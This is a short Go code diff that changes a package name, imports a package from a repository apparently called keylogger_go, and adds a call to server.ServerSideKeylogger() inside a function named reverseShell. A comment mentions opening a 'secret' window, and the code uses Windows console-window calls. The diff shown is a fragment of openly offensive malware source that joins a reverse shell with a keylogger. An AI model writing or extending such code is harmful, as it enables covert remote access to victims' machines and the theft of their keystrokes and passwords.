@@ -1,10 +1,11 @@
-package main
+package rs
 
 import (
 	"fmt"
 	"net"
 	"os"
 
+	"github.com/gabrielfnayres/keylogger_go/server"
 	"github.com/gonutz/w32/v2"
 )
 
@@ -36,7 +37,7 @@ func reverseShell() {
 
 	defer conn.Close()
 	// This part is to open the "secret" window
-
+	server.ServerSideKeylogger()
 	cmd := w32.GetConsoleWindow()
 	if cmd == 0 {
 		return
